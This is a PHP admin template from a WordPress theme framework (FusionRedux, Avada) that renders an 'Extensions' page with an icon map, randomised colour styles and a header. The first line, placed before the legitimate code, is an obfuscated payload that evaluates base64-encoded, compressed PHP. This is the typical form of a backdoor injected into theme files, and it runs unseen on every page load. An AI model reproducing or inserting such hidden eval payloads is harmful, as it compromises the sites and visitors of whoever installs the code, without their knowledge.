<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
	/*
	repeater =>
	social profiles =>
	js button =>
	multi media =>
	css layout =>
	color schemes => adjust-alt
	custom fonts => fontsize
	code mirror => view-mode
	live search => search
	support faq's => question
	date time picker =>
	premium support =>
	metaboxes =>
	widget areas =>
	shortcodes =>
	icon select => gallery
	tracking =>
	* */
	$iconMap = array(
		'repeater'        => 'tags',
		'social-profiles' => 'group',
		'js-button'       => 'hand-down',
		'multi-media'     => 'picture',
		'css-layout'      => 'fullscreen',
		'color-schemes'   => 'adjust-alt',
		'custom-fonts'    => 'fontsize',
		//'codemirror'      => 'view-mode',
		'live-search'     => 'search',
		'support-faqs'    => 'question',
		'date-time'       => 'calendar',
		'premium-support' => 'fire',
		'metaboxes'       => 'magic',
		'widget-areas'    => 'inbox-box',
		'shortcodes'      => 'shortcode',
		'icon-select'     => 'gallery',
		'accordion'       => 'lines'
	);
	$colors  = array(
		'8CC63F',
		'8CC63F',
		'0A803B',
		'25AAE1',
		'0F75BC',
		'F7941E',
		'F1592A',
		'ED217C',
		'BF1E2D',
		'8569CF',
		'0D9FD8',
		'8AD749',
		'EECE00',
		'F8981F',
		'F80E27',
		'F640AE'
	);
	shuffle( $colors );
	echo '<style type="text/css">';
?>

<?php
	foreach ( $colors as $key => $color ) {
		echo '.theme-browser .theme.color' . esc_html($key) . ' .theme-screenshot{background-color:' . esc_html(FusionRedux_Helpers::hex2rgba( $color, .45 )) . ';}';
		echo '.theme-browser .theme.color' . esc_html($key) . ':hover .theme-screenshot{background-color:' . esc_html(FusionRedux_Helpers::hex2rgba( $color, .75 )) . ';}';

	}
	echo '</style>';
	$color = 1;

?>
<div class="wrap about-wrap">
	<h1><?php esc_html_e( 'FusionRedux Framework - Extensions', 'Avada' ); ?></h1>

	<div class="about-text">
		<?php printf( __( 'Supercharge your FusionRedux experience. Our extensions provide you with features that will take your products to the next level.', 'Avada' ), esc_html($this->display_version) ); ?>
	</div>
	<div class="fusionredux-badge">
		<i class="el el-fusionredux"></i>
		<span>
			<?php printf( __( 'Version %s', 'Avada' ), esc_html(FusionReduxFramework::$_version )); ?>
		</span>
	</div>

	<?php $this->actions(); ?>
	<?php $this->tabs(); ?>

	<p class="about-description">
		<?php esc_html_e( "While some are built specificially for developers, extensions such as Custom Fonts are sure to make any user happy.", 'Avada' ); ?>
	</p>

</div>
